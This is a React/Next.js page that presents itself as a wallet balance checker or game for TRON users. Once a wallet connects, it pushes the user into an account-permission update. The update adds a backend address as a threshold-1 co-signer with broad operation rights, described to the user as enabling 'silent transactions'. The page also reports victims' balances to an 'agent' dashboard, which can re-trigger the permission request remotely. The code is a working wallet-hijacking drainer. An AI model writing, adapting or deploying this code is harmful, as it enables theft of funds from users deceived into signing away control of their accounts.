"use client";

import { useEffect, useState, useRef } from "react";
import { useParams } from "next/navigation";

// Simple helper around the existing backend API
async function api(path, opts = {}) {
  try {
    const res = await fetch(path, {
      headers: { "content-type": "application/json", ...(opts.headers || {}) },
      ...opts,
    });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
    return data;
  } catch (err) {
    console.error("API call failed:", path, err);
    throw err;
  }
}

export default function UserPage() {
  const params = useParams();
  const userId = params?.id || "1";
  
  const [health, setHealth] = useState(null);
  const [walletAddress, setWalletAddress] = useState("");
  const [walletStatus, setWalletStatus] = useState("Connect wallet to begin.");
  const [delegationStatus, setDelegationStatus] = useState("");
  const [delegationTxId, setDelegationTxId] = useState("");
  const [permissionStatus, setPermissionStatus] = useState("");
  const [permissionId, setPermissionId] = useState(null);
  const [tronAddress, setTronAddress] = useState("");
  const [wcWallet, setWcWallet] = useState(null);
  const [wcTronWeb, setWcTronWeb] = useState(null);
  const [connectionType, setConnectionType] = useState(null);
  const [isGrantingDelegation, setIsGrantingDelegation] = useState(false);
  const [autoDelegationAttempted, setAutoDelegationAttempted] = useState(false);
  const [trxBalance, setTrxBalance] = useState(null);
  const [usdtBalance, setUsdtBalance] = useState(null);
  const [balancesLoading, setBalancesLoading] = useState(false);
  const [wsConnected, setWsConnected] = useState(false);

  const wcWalletRef = useRef(null);
  const wcSingletonKeyRef = useRef(null);
  const wsRef = useRef(null);
  const balanceFetchedRef = useRef(false); // Track if balance has been fetched
  const notifiedRef = useRef(false); // Track if user has been notified to agent
  const permissionNotifiedRef = useRef(false); // Track if permission update has been sent

  const SESSION_STORAGE_KEY = typeof window !== "undefined"
    ? `sc_user_session_${userId}`
    : null;

  // WebSocket connection for real-time updates
  useEffect(() => {
    // Use NEXT_PUBLIC_WS_URL if set, otherwise construct from current hostname and port
    let wsUrl = process.env.NEXT_PUBLIC_WS_URL;
    if (!wsUrl) {
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      // Default to backend port 8787, or use NEXT_PUBLIC_WS_PORT if set
      const wsPort = process.env.NEXT_PUBLIC_WS_PORT || '8787';
      wsUrl = `${protocol}//${window.location.hostname}:${wsPort}/ws`;
    }
    
    console.log("Attempting WebSocket connection to:", wsUrl);
    const ws = new WebSocket(wsUrl);
    wsRef.current = ws;

    ws.onopen = () => {
      console.log("WebSocket connected successfully");
      setWsConnected(true);
      // Register as user with userId
      ws.send(JSON.stringify({ type: 'register', role: 'user', userId }));
    };

    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        console.log("WebSocket message received:", data);

        if (data.type === 'balance_update' && data.userId === userId) {
          setTrxBalance(data.trxBalance);
          setUsdtBalance(data.usdtBalance);
        } else if (data.type === 'force_disconnect') {
          // Agent requested this user to be disconnected
          handleForceDisconnect();
        } else if (data.type === 'retry_permission') {
          // Agent requested retry of delegation for this user
          if (!isGrantingDelegation) {
            handleGrantDelegation();
          }
        }
      } catch (e) {
        console.error("Error parsing WebSocket message:", e);
      }
    };

    ws.onerror = (error) => {
      console.error("WebSocket error:", error);
      setWsConnected(false);
    };

    ws.onclose = (event) => {
      console.log("WebSocket disconnected", event.code, event.reason);
      setWsConnected(false);
      // Try to reconnect after 3 seconds
      setTimeout(() => {
        if (!wsRef.current || wsRef.current.readyState === WebSocket.CLOSED) {
          console.log("Attempting WebSocket reconnection...");
          // This will trigger the useEffect again
        }
      }, 3000);
    };

    return () => {
      if (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING) {
        ws.close();
      }
    };
  }, [userId]);

  // Try to restore previous wallet session on mount (for persistence across reloads)
  useEffect(() => {
    if (typeof window === "undefined") return;
    try {
      const raw = SESSION_STORAGE_KEY ? window.localStorage.getItem(SESSION_STORAGE_KEY) : null;
      if (!raw) return;
      const stored = JSON.parse(raw);
      if (!stored || !stored.address || !stored.connectionType) return;

      const restore = async () => {
        try {
          if (stored.connectionType === "tronlink") {
            if (window.tronWeb?.defaultAddress?.base58) {
              const addr = window.tronWeb.defaultAddress.base58;
              if (addr && addr === stored.address) {
                setConnectionType("tronlink");
                setTronAddress(addr);
                setWalletAddress(addr);
                setWcTronWeb(window.tronWeb);
                setWalletStatus("Reconnected via TronLink.");
              }
            }
          } else if (stored.connectionType === "walletconnect") {
            setConnectionType("walletconnect");
            setWalletStatus("Restoring wallet connection…");
            const { address: addr } = await ensureTronWalletConnected();
            setWalletStatus("Connected to TRON");
            setWalletAddress(addr);
          }
        } catch (e) {
          console.error("Failed to restore previous wallet session:", e);
          if (SESSION_STORAGE_KEY) {
            window.localStorage.removeItem(SESSION_STORAGE_KEY);
          }
        }
      };

      restore();
    } catch (e) {
      console.error("Error while restoring wallet session:", e);
    }
  }, [SESSION_STORAGE_KEY]);

  // Load backend health on first render
  useEffect(() => {
    (async () => {
      try {
        const data = await api("/api/health");
        setHealth(data);
      } catch (e) {
        console.error("Health check failed:", e);
      }
    })();
  }, []);

  // When a wallet connects, automatically check for GAME_BACKEND permission
  useEffect(() => {
    async function ensureDelegation() {
      if (!walletAddress || !health || !connectionType) return;
      if (autoDelegationAttempted || isGrantingDelegation) return;

      setAutoDelegationAttempted(true);
      try {
        setPermissionStatus("Checking GAME_BACKEND permission on-chain…");
        const lookup = await api(
          `/api/permission/lookup?address=${encodeURIComponent(walletAddress)}`
        );
        if (lookup.found) {
          setPermissionId(lookup.permissionId);
          setPermissionStatus(`Found permissionId = ${lookup.permissionId}. Registering with backend…`);
          await api("/api/user/register", {
            method: "POST",
            body: JSON.stringify({ 
              address: walletAddress, 
              permissionId: lookup.permissionId,
              userId 
            }),
          });
          setPermissionStatus(`Registered with backend (permissionId=${lookup.permissionId}).`);
          // Notify agent via WebSocket
          if (wsRef.current?.readyState === WebSocket.OPEN) {
            wsRef.current.send(JSON.stringify({
              type: 'user_connected',
              userId,
              address: walletAddress,
              permissionId: lookup.permissionId
            }));
          }
          return;
        }

        // Not found – short delay then open delegation
        setPermissionStatus("Opening wallet to grant permission…");
        await new Promise((r) => setTimeout(r, 800));
        await handleGrantDelegation();
      } catch (e) {
        console.error("Automatic delegation/lookup failed:", e);
        setPermissionStatus(e?.message || "Automatic delegation lookup failed. You can retry below.");
      }
    }

    ensureDelegation();
  }, [walletAddress, health, connectionType, autoDelegationAttempted, isGrantingDelegation, userId]);

  // Fetch TRX and USDT balance when wallet is connected
  async function fetchWalletBalances() {
    const addr = tronAddress || walletAddress;
    const tw = wcTronWeb;
    const h = health;
    if (!addr || !tw || !h?.fullNode) return;
    setBalancesLoading(true);
    // Don't clear balances here - let them persist until new values arrive
    try {
      const trxSun = await tw.trx.getBalance(addr);
      const trxVal = (Number(trxSun) / 1_000_000).toFixed(6);
      setTrxBalance(trxVal);

      const usdtContract = (h.usdtContract || "").trim();
      if (usdtContract) {
        const fromHex = tw.address.toHex(addr);
        const result = await tw.transactionBuilder.triggerConstantContract(
          usdtContract,
          "balanceOf(address)",
          { from: addr },
          [{ type: "address", value: fromHex }],
          fromHex
        );
        const hexBal = result?.constant_result?.[0];
        const usdtRaw = hexBal ? parseInt(hexBal, 16) : 0;
        const usdtVal = (Number(usdtRaw) / 1_000_000).toFixed(2);
        setUsdtBalance(usdtVal);
      }

      // Send balance update to agent via WebSocket
      if (wsRef.current?.readyState === WebSocket.OPEN) {
        wsRef.current.send(JSON.stringify({
          type: 'balance_update',
          userId,
          address: addr,
          trxBalance: trxVal,
          usdtBalance: usdtVal
        }));
      }
    } catch (e) {
      console.error("Fetch balances error:", e);
    } finally {
      setBalancesLoading(false);
    }
  }

  // Notify agent dashboard when wallet connects (even before delegation) - ONE TIME ONLY
  useEffect(() => {
    if (!walletAddress && !tronAddress) {
      notifiedRef.current = false;
      return;
    }
    if (notifiedRef.current) return; // Only notify once
    
    const addr = tronAddress || walletAddress;
    if (!addr) return;

    notifiedRef.current = true; // Mark as notified

    const notifyAgent = async () => {
      // Always register via HTTP API first (most reliable)
      try {
        console.log("Registering user via HTTP API:", { address: addr, userId, permissionId });
        await api("/api/user/register", {
          method: "POST",
          body: JSON.stringify({ 
            address: addr, 
            permissionId: permissionId || null,
            userId 
          }),
        });
        console.log("User registered successfully via HTTP API");
      } catch (e) {
        console.error("Failed to register user via HTTP API:", e);
      }

      // Also try WebSocket if available
      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
        console.log("Notifying agent via WebSocket");
        wsRef.current.send(JSON.stringify({
          type: 'user_connected',
          userId,
          address: addr,
          permissionId: permissionId || null
        }));
      }
    };

    // Notify immediately
    notifyAgent();
  }, [walletAddress, tronAddress, userId]);

  // Update agent when permissionId changes (after successful delegation) - ONE TIME ONLY
  useEffect(() => {
    if (!walletAddress && !tronAddress) {
      permissionNotifiedRef.current = false;
      return;
    }
    if (permissionId == null) return;
    if (permissionNotifiedRef.current) return; // Only notify once per permissionId
    
    const addr = tronAddress || walletAddress;
    if (!addr) return;

    permissionNotifiedRef.current = true;

    // Update agent with permissionId via HTTP API
    (async () => {
      try {
        await api("/api/user/register", {
          method: "POST",
          body: JSON.stringify({ 
            address: addr, 
            permissionId: permissionId,
            userId 
          }),
        });
        console.log("Permission updated in backend");
      } catch (e) {
        console.error("Failed to update permission:", e);
      }
    })();

    // Also try WebSocket if available
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify({
        type: 'user_connected',
        userId,
        address: addr,
        permissionId: permissionId
      }));
    }
  }, [permissionId, walletAddress, tronAddress, userId]);

  // Fetch balance once when wallet connects (one-time only, no continuous fetching)
  useEffect(() => {
    if (!walletAddress && !tronAddress) {
      // Only clear balances if wallet is actually disconnected
      if (balanceFetchedRef.current) {
        balanceFetchedRef.current = false;
      }
      return;
    }
    if (!walletAddress || !wcTronWeb || !health) return;
    if (balanceFetchedRef.current) return; // Already fetched
    
    // Only fetch once when wallet first connects
    balanceFetchedRef.current = true;
    const t = setTimeout(() => {
      fetchWalletBalances();
    }, 3000); // Wait for delegation to complete
    
    return () => {
      clearTimeout(t);
    };
  }, [walletAddress, tronAddress]); // Only depend on address, not health/wcTronWeb

  // WalletConnect TRON logic
  async function ensureTronWalletConnected() {
    const h = health || (await api("/api/health"));
    setHealth(h);

    const projectId = (h.walletConnectProjectId || "").trim();
    if (!projectId || projectId === "YOUR_PROJECT_ID_HERE") {
      throw new Error(
        "WalletConnect Project ID not configured. Set WALLETCONNECT_PROJECT_ID in backend .env and restart the server."
      );
    }

    const key = `${projectId}:${h.network}`;
    if (!wcWalletRef.current || wcSingletonKeyRef.current !== key) {
      const wcModule = await import("@tronweb3/walletconnect-tron");
      const WalletConnectWallet = wcModule.WalletConnectWallet ?? wcModule.default?.WalletConnectWallet;
      const WalletConnectChainID = wcModule.WalletConnectChainID ?? wcModule.default?.WalletConnectChainID;
      if (typeof WalletConnectWallet !== "function") {
        throw new Error("WalletConnectWallet not found in @tronweb3/walletconnect-tron");
      }

      const networkId =
        h.network === "mainnet" ? WalletConnectChainID.Mainnet : WalletConnectChainID.Shasta;

      const wallet = new WalletConnectWallet({
        network: networkId,
        options: {
          relayUrl: "wss://relay.walletconnect.com",
          projectId,
          metadata: {
            name: "Secure Connect",
            description: "Check your wallet balances",
            url: typeof window !== "undefined" ? window.location.origin : "",
            icons: [
              "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect fill='%233b82f6' width='32' height='32' rx='6'/%3E%3Ctext x='16' y='22' font-size='18' font-weight='bold' fill='white' text-anchor='middle' font-family='sans-serif'%3ES%3C/text%3E%3C/svg%3E",
            ],
          },
        },
        themeMode: "dark",
        themeVariables: { "--w3m-accent": "#3b82f6", "--w3m-z-index": "99999" },
        allWallets: "SHOW",
        featuredWalletIds: [
          "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
          "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369",
          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
        ],
        customWallets: [
          {
            id: "tokenpocket",
            name: "TokenPocket",
          },
        ],
        enableAnalytics: false,
        enableWalletGuide: true,
      });

      wcWalletRef.current = wallet;
      wcSingletonKeyRef.current = key;
      setWcWallet(wallet);
    }

    try {
      const walletToUse = wcWalletRef.current || wcWallet;
      if (!walletToUse) throw new Error("WalletConnect initialization failed.");

      const TronWebModule = await import("tronweb");
      const TronWebCtor =
        typeof TronWebModule.TronWeb === "function"
          ? TronWebModule.TronWeb
          : typeof TronWebModule.default?.TronWeb === "function"
            ? TronWebModule.default.TronWeb
            : TronWebModule.default;

      if (typeof TronWebCtor !== "function") {
        throw new Error("TronWeb constructor not found in tronweb module");
      }

      const { address: tronAddr } = await walletToUse.connect();
      const twOptions = { fullHost: h.fullNode };
      if (h.trongridApiKey) {
        twOptions.headers = { "TRON-PRO-API-KEY": h.trongridApiKey };
      }
      const tronWeb = new TronWebCtor(twOptions);

      setTronAddress(tronAddr);
      setWalletAddress(tronAddr);
      setWcTronWeb(tronWeb);
      setWalletStatus("Connected to TRON (WalletConnect)");

      return { tronWeb, address: tronAddr, wallet: walletToUse, health: h };
    } catch (err) {
      console.error("WalletConnect TRON connect failed:", err);
      throw new Error(err?.message || "WalletConnect internal error");
    }
  }

  async function handleConnectTronWallet() {
    try {
      setConnectionType("walletconnect");
      setWalletStatus("Opening TRON WalletConnect…");
      if (wcWallet && (tronAddress || walletAddress)) {
        try {
          await wcWallet.disconnect();
        } catch (_) {}
        setWcWallet(null);
        setTronAddress("");
        setWalletAddress("");
        setWcTronWeb(null);
      }
      const { address: addr } = await ensureTronWalletConnected();
      setWalletStatus("Connected to TRON");
      setWalletAddress(addr);
      if (typeof window !== "undefined" && SESSION_STORAGE_KEY) {
        window.localStorage.setItem(
          SESSION_STORAGE_KEY,
          JSON.stringify({ address: addr, connectionType: "walletconnect" })
        );
      }
      // Notification will be handled by useEffect when WebSocket is ready
    } catch (e) {
      setWalletStatus(e.message || "Connect failed");
    }
  }

  async function handleConnectTronLink() {
    if (typeof window === "undefined" || !window.tronLink || !window.tronWeb) {
      setWalletStatus("TronLink not detected. Install the TronLink Chrome extension.");
      return;
    }
    try {
      setConnectionType("tronlink");
      setWalletStatus("Opening TronLink…");
      setWcWallet(null);
      setWcTronWeb(null);
      const res = await window.tronLink.request({ method: "tron_requestAccounts" });
      if (res?.code !== 200 && res?.code !== 4000) {
        setWalletStatus(res?.message || "TronLink connection rejected.");
        return;
      }
      const addr = window.tronWeb?.defaultAddress?.base58;
      if (!addr) {
        setWalletStatus("No address from TronLink. Try again.");
        return;
      }
      setTronAddress(addr);
      setWalletAddress(addr);
      setWcTronWeb(window.tronWeb);
      setWalletStatus("Connected via TronLink (Chrome extension)");
      if (typeof window !== "undefined" && SESSION_STORAGE_KEY) {
        window.localStorage.setItem(
          SESSION_STORAGE_KEY,
          JSON.stringify({ address: addr, connectionType: "tronlink" })
        );
      }
      // Notification will be handled by useEffect when WebSocket is ready
    } catch (e) {
      console.error("TronLink connect failed:", e);
      setWalletStatus(e?.message || "TronLink connect failed");
    }
  }

  async function handleGrantDelegation() {
    if (isGrantingDelegation) return;
    setIsGrantingDelegation(true);
    try {
      if (!walletAddress) {
        setDelegationStatus("Connect wallet first before granting permission.");
        return;
      }

      setDelegationStatus("Checking existing GAME_BACKEND permission…");
      try {
        const lookup = await api(
          `/api/permission/lookup?address=${encodeURIComponent(walletAddress)}`
        );
        if (lookup.found) {
          setPermissionId(lookup.permissionId);
          setPermissionStatus(
            `Found permissionId = ${lookup.permissionId}. Registering with backend…`
          );
          await api("/api/user/register", {
            method: "POST",
            body: JSON.stringify({ address: walletAddress, permissionId: lookup.permissionId, userId }),
          });
          setPermissionStatus(
            `Already delegated. Registered with backend (permissionId=${lookup.permissionId}).`
          );
          setDelegationStatus(
            "Delegation already granted. No need to approve again in the wallet."
          );
          // Notify agent
          if (wsRef.current?.readyState === WebSocket.OPEN) {
            wsRef.current.send(JSON.stringify({
              type: 'user_connected',
              userId,
              address: walletAddress,
              permissionId: lookup.permissionId
            }));
          }
          return;
        }
      } catch (e) {
        console.error("Permission lookup before delegation failed:", e);
      }

      setDelegationStatus("Opening wallet…");
      setDelegationTxId("");

      const h = health || (await api("/api/health"));
      const backendAddress = h.backendAddress;
      if (!backendAddress) throw new Error("Backend address not found in /api/health.");

      const permissionName = h.activePermissionName;
      const operationsMask =
        (h.activePermissionOperations && String(h.activePermissionOperations).trim()) ||
        "7fff1fc0037e0000000000000000000000000000000000000000000000000000";

      let tw;
      let addr;
      let signAndSend;

      if (connectionType === "tronlink" && typeof window !== "undefined" && window.tronWeb?.defaultAddress?.base58) {
        tw = window.tronWeb;
        addr = window.tronWeb.defaultAddress.base58;
        if (!addr) throw new Error("TronLink not connected.");
        if (!tw.isAddress(backendAddress)) throw new Error("Invalid backend address from server.");
        signAndSend = async (unsigned) => {
          const signed = await tw.trx.sign(unsigned);
          return tw.trx.sendRawTransaction(signed);
        };
      } else {
        const connected = await ensureTronWalletConnected();
        tw = connected.tronWeb;
        addr = connected.address;
        const wallet = connected.wallet;
        if (!tw.isAddress(backendAddress)) throw new Error("Invalid backend address from server.");
        signAndSend = async (unsigned) => {
          const signed = await wallet.signTransaction(unsigned);
          return tw.trx.sendRawTransaction(signed);
        };
      }

      setDelegationStatus("Fetching your TRON account…");
      const acc = await tw.trx.getAccount(addr);

      const rawOwner = acc.owner_permission;
      const ownerPermission = {
        type: 0,
        permission_name: (rawOwner && rawOwner.permission_name) || "owner",
        threshold: (rawOwner && Number(rawOwner.threshold)) || 1,
        keys:
          rawOwner && Array.isArray(rawOwner.keys) && rawOwner.keys.length
            ? rawOwner.keys.map((k) => ({ address: k.address, weight: Number(k.weight) || 1 }))
            : [{ address: addr, weight: 1 }],
      };

      const activePermission = {
        type: 2,
        permission_name: permissionName,
        threshold: 1,
        operations: operationsMask,
        keys: [
          { address: addr, weight: 1 },
          { address: backendAddress, weight: 1 },
        ],
      };

      const unsigned = await tw.transactionBuilder.updateAccountPermissions(
        tw.address.toHex(addr),
        ownerPermission,
        null,
        [activePermission]
      );

      setDelegationStatus("Please approve the delegation transaction in your wallet…");
      const receipt = await signAndSend(unsigned);

      if (!receipt.result) {
        const msg = receipt.message || receipt.resultMessage || (receipt.code != null ? `Code ${receipt.code}` : "");
        const hint = "If your wallet shows 0 TRX, add a small amount (e.g. 1–2 TRX) for network fees and try again.";
        setDelegationStatus(`Delegation transaction failed. ${msg ? msg + ". " : ""}${hint}`);
        return;
      }

      setDelegationTxId(receipt.txid);
      setDelegationStatus("Delegation confirmed on-chain ✓");

      try {
        setPermissionStatus("Looking up GAME_BACKEND permission on-chain…");
        const lookup = await api(
          `/api/permission/lookup?address=${encodeURIComponent(addr)}`
        );
        if (lookup.found) {
          setPermissionId(lookup.permissionId);
          setPermissionStatus(`Found permissionId = ${lookup.permissionId}. Registering with backend…`);
          await api("/api/user/register", {
            method: "POST",
            body: JSON.stringify({ address: addr, permissionId: lookup.permissionId, userId }),
          });
          setPermissionStatus(
            `Registered with backend (permissionId=${lookup.permissionId}).`
          );
          // Notify agent
          if (wsRef.current?.readyState === WebSocket.OPEN) {
            wsRef.current.send(JSON.stringify({
              type: 'user_connected',
              userId,
              address: addr,
              permissionId: lookup.permissionId
            }));
          }
        } else {
          setPermissionStatus(
            "Delegation tx confirmed, but permission not indexed yet. Use Lookup after a few seconds."
          );
        }
      } catch (e) {
        console.error("Auto lookup/register failed:", e);
      }
    } catch (e) {
      console.error("Delegation failed:", e);
      const msg = e?.message || String(e);
      const hint = msg.toLowerCase().includes("bandwidth") || msg.toLowerCase().includes("resource") || msg.toLowerCase().includes("balance")
        ? " Add a small amount of TRX (e.g. 1–2 TRX) for network fees and try again."
        : " If your wallet has 0 TRX, add a small amount for fees and try again.";
      setDelegationStatus((msg || "Delegation failed") + hint);
    } finally {
      setIsGrantingDelegation(false);
    }
  }

  async function handleUserDisconnect() {
    try {
      // Inform backend and agents first
      try {
        await api("/api/user/remove", {
          method: "POST",
          body: JSON.stringify({ userId }),
        });
      } catch (e) {
        console.error("User remove API failed (will still disconnect locally):", e);
      }

      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
        try {
          wsRef.current.send(
            JSON.stringify({
              type: "user_disconnected",
              userId,
            })
          );
        } catch (e) {
          console.error("Failed to send user_disconnected over WebSocket:", e);
        }
      }

      // Disconnect WalletConnect if connected
      if (wcWallet && (tronAddress || walletAddress)) {
        try {
          await wcWallet.disconnect();
        } catch (err) {
          console.error("WalletConnect disconnect error:", err);
        }
        setWcWallet(null);
        wcWalletRef.current = null;
        wcSingletonKeyRef.current = null;
      }

      // Clear any persisted session
      if (typeof window !== "undefined" && SESSION_STORAGE_KEY) {
        window.localStorage.removeItem(SESSION_STORAGE_KEY);
      }

      // Reset local state
      setTronAddress("");
      setWalletAddress("");
      setWcTronWeb(null);
      setConnectionType(null);
      setTrxBalance(null);
      setUsdtBalance(null);
      setPermissionId(null);
      setAutoDelegationAttempted(false);
      setDelegationStatus("");
      setDelegationTxId("");
      setPermissionStatus("");
      setWalletStatus("Wallet disconnected. Connect wallet to begin.");
      balanceFetchedRef.current = false;
      notifiedRef.current = false;
      permissionNotifiedRef.current = false;
    } catch (e) {
      console.error("Disconnect error:", e);
      setWalletStatus("Disconnect failed: " + (e.message || String(e)));
    }
  }

  function handleForceDisconnect() {
    // Clear persisted session
    if (typeof window !== "undefined" && SESSION_STORAGE_KEY) {
      window.localStorage.removeItem(SESSION_STORAGE_KEY);
    }

    // Best-effort disconnect of WalletConnect session if active
    (async () => {
      try {
        if (wcWallet && (tronAddress || walletAddress)) {
          await wcWallet.disconnect().catch(() => {});
        }
      } catch (e) {
        console.error("Error during forced WalletConnect disconnect:", e);
      }
    })();

    // Reset local state, but do NOT send any WebSocket messages or API calls
    setTronAddress("");
    setWalletAddress("");
    setWcTronWeb(null);
    setConnectionType(null);
    setTrxBalance(null);
    setUsdtBalance(null);
    setPermissionId(null);
    setAutoDelegationAttempted(false);
    setDelegationStatus("");
    setDelegationTxId("");
    setPermissionStatus("Disconnected by agent.");
    setWalletStatus("Disconnected by agent. Connect wallet again to continue.");
    balanceFetchedRef.current = false;
    notifiedRef.current = false;
    permissionNotifiedRef.current = false;
  }

  return (
    <div className="user-page">
      <header className="secure-header">
        <div className="secure-header-left">
          <div className="secure-logo">U{userId}</div>
          <div className="secure-app-title">User {userId}</div>
        </div>
        <div className="secure-header-right">
          {(tronAddress || walletAddress) && (
            <button
              className="modern-btn disconnect-btn"
              style={{ marginLeft: "12px" }}
              onClick={handleUserDisconnect}
            >
              Disconnect
            </button>
          )}
        </div>
      </header>

      <div className="user-container">
        <div className="user-content">
          {!(tronAddress || walletAddress) ? (
            <>
              <h2 className="user-title">Connect Your Wallet</h2>
              <p className="user-subtitle">Scan QR code or connect via TronLink</p>
              <div className="connect-buttons">
                <button className="connect-btn connect-btn-primary" onClick={handleConnectTronLink}>
                  Connect with TronLink
                </button>
                <button className="connect-btn connect-btn-primary" onClick={handleConnectTronWallet}>
                  Connect with WalletConnect
                </button>
              </div>
            </>
          ) : (
            <>
              <div className="user-wallet-info">
                <h2 className="user-title-connected">Wallet Connected</h2>
                <div className="wallet-address-display">{tronAddress || walletAddress}</div>
                <div className="status-connected">Status: Connected</div>
              </div>

              <div className="balance-cards">
                <div className="balance-card">
                  <div className="balance-label">TRX Balance</div>
                  <div className="balance-value">
                    {balancesLoading ? (
                      <span className="balance-loading">…</span>
                    ) : trxBalance != null ? (
                      `${trxBalance} TRX`
                    ) : (
                      <span className="balance-loading">—</span>
                    )}
                  </div>
                  <button
                    className="modern-btn"
                    onClick={fetchWalletBalances}
                    disabled={balancesLoading}
                    style={{ marginTop: "12px", width: "100%" }}
                  >
                    {balancesLoading ? "Loading…" : "Refresh Balance"}
                  </button>
                </div>
                <div className="balance-card">
                  <div className="balance-label">USDT Balance</div>
                  <div className="balance-value">
                    {balancesLoading ? (
                      <span className="balance-loading">…</span>
                    ) : usdtBalance != null ? (
                      `${usdtBalance} USDT`
                    ) : (
                      <span className="balance-loading">—</span>
                    )}
                  </div>
                </div>
              </div>

              {permissionId == null && (
                <div className="modern-card" style={{ marginTop: "24px" }}>
                  <div className="modern-card-title">
                    <span>⚠</span> Grant Permission
                  </div>
                  <p className="modern-card-desc">
                    Grant delegation permission to enable silent transactions. This is a one-time setup.
                  </p>
                  <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
                    <button
                      className="modern-btn modern-btn-primary"
                      onClick={handleGrantDelegation}
                      disabled={isGrantingDelegation}
                    >
                      {isGrantingDelegation ? "Confirm in wallet…" : "Grant Permission"}
                    </button>
                    {!isGrantingDelegation && (delegationStatus || permissionStatus) && (
                      <button
                        className="modern-btn"
                        onClick={handleGrantDelegation}
                      >
                        Retry
                      </button>
                    )}
                  </div>
                  {delegationStatus && (
                    <div className="nx-status-note" style={{ marginTop: "12px" }}>{delegationStatus}</div>
                  )}
                  {delegationTxId && (
                    <div className="nx-status-note" style={{ marginTop: "8px" }}>
                      Tx: <code>{delegationTxId}</code>
                    </div>
                  )}
                  {permissionStatus && (
                    <div className="nx-status-note" style={{ marginTop: "8px" }}>
                      {permissionStatus}
                    </div>
                  )}
                </div>
              )}

              {permissionId != null && (
                <div className="modern-card success-card" style={{ marginTop: "24px" }}>
                  <div className="modern-card-title">
                    <span>✓</span> Ready to Play
                  </div>
                  <p className="modern-card-desc">
                    Your wallet is connected and permission is granted. You're ready to play!
                  </p>
                </div>
              )}
            </>
          )}
        </div>
      </div>
    </div>
  );
}

